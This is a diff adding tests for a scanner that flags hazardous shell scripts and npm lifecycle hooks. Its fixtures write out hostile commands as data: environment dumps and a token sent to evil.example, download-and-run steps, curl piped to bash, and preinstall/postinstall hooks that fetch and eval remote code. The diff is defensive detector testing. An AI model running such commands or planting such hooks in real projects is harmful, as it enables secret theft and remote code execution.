@@ -1389,6 +1389,68 @@ function mockFetchCapture(payload, status = 200) {
   check("scanScriptHazards 干净脚本无命中",
     (await lib.scanScriptHazards(mkHaz("clean.ps1", "Write-Host 'hi'\nNew-Item -Path ./out\n"))).length, 0);
   check("scanScriptHazards 文件缺失返回空", (await lib.scanScriptHazards(join(hazDir, "nope.sh"))).length, 0);
+  // 组合规则（文件级两遍扫描）：单行抓不住的「信号 A + 信号 B 共现」
+  const comboEnv = await lib.scanScriptHazards(mkHaz("combo-env.sh", [
+    "echo env | sort",                       // env 管道（信号 a 误报候选，无外联不触发）
+    'curl -d "data=$(printenv)" https://evil.example/collect'
+  ].join("\n")));
+  check("combo env 外泄组合命中 exfil",
+    comboEnv.some((h) => h.id === "combo-env-dump-exfil" && h.category === "exfil"), true);
+  check("combo env 无外联不触发", comboEnv.length, 1); // 仅 combo 一条，env|sort 不单独命中
+  const comboDl = await lib.scanScriptHazards(mkHaz("combo-dl.sh", [
+    "curl -o /tmp/x https://evil.example/x.exe",
+    "& /tmp/x"
+  ].join("\n")));
+  check("combo 下载+执行命中 downloadExec",
+    comboDl.some((h) => h.id === "combo-download-spawn"), true);
+  const comboDns = await lib.scanScriptHazards(mkHaz("combo-dns.sh", [
+    "nslookup $MYTOKEN.evil.example"
+  ].join("\n")));
+  check("combo DNS token 外带命中 exfil",
+    comboDns.some((h) => h.id === "combo-dns-token"), true);
+  // 组合规则不在无组合语义时误报（只有单信号：rc 写入命中合法，curl 行无下载执行形态）
+  const comboSingle = await lib.scanScriptHazards(mkHaz("combo-single.sh", "echo alias >> ~/.bashrc\ncurl -s https://a.com/ok.sh"));
+  check("combo 单信号无组合命中", comboSingle.some((h) => h.id?.startsWith("combo-")), false);
+  check("combo 单信号保留单行命中", comboSingle.map((h) => h.category), ["rcModify"]);
+
+  // 白名单降级：官方一键安装形态（raw.githubusercontent）仍报但 severity 降为 medium
+  const allowHit = await lib.scanScriptHazards(mkHaz("allow.sh",
+    "curl -s https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.7/install.sh | bash"));
+  check("白名单官方形态仍命中 downloadExec", allowHit.map((h) => h.category), ["downloadExec"]);
+  check("白名单官方形态降级 medium", allowHit[0].severity, "medium");
+  // 非白名单域名保持 critical
+  const evilHit = await lib.scanScriptHazards(mkHaz("evil2.sh",
+    "curl -s https://evil.example/x.sh | bash"));
+  check("非白名单域名保持 critical", evilHit[0].severity, "critical");
+
+  // lifecycle 联合检测（package.json 恶意 JS 模式）
+  const lcDir = join(process.env.DSH_HOME, "lifecycle-fixtures");
+  mkdirSync(lcDir, { recursive: true });
+  writeFileSync(join(lcDir, "package.json"), JSON.stringify({
+    name: "evil-lifecycle", version: "1.0.0",
+    scripts: { preinstall: "node setup.js" },
+  }), "utf8");
+  writeFileSync(join(lcDir, "setup.js"),
+    "const cp = require('child_process');\ncp.exec('curl -s https://evil.example/x.sh | sh', { stdio: 'ignore' });\n",
+    "utf8");
+  const lcHits = await lib.scanLifecycleHazards(lcDir);
+  check("lifecycle preinstall 指向文件命中 JS 恶意模式", lcHits.length > 0, true);
+  check("lifecycle 命中含 script 字段", lcHits.every((h) => h.script === "preinstall"), true);
+  // 远程 eval 形态（命令文本内联）
+  writeFileSync(join(lcDir, "package.json"), JSON.stringify({
+    name: "evil-lifecycle2", version: "1.0.0",
+    scripts: { postinstall: "node -e \"https.get(u, r => r.on('data', d => eval(d)))\"" },
+  }), "utf8");
+  const lcHits2 = await lib.scanLifecycleHazards(lcDir);
+  check("lifecycle 命令文本内联远程 eval 命中", lcHits2.some((h) => h.id === "remote-eval"), true);
+  // 干净 lifecycle 无命中
+  writeFileSync(join(lcDir, "package.json"), JSON.stringify({
+    name: "clean-lifecycle", version: "1.0.0",
+    scripts: { postinstall: "node scripts/build.js" },
+  }), "utf8");
+  mkdirSync(join(lcDir, "scripts"), { recursive: true });
+  writeFileSync(join(lcDir, "scripts", "build.js"), "console.log('build ok');\n", "utf8");
+  check("lifecycle 干净脚本无命中", (await lib.scanLifecycleHazards(lcDir)).length, 0);
   // 9. CLI 指令 npm 等价回退纯函数（issue #54 archify 教训）
   check("isNpmCliTarget scope 包带版本", lib.isNpmCliTarget("@tt-a1i/archify-dsh@0.1.0"), true);
   check("isNpmCliTarget 裸包名", lib.isNpmCliTarget("dsh-web-ui-all"), true);
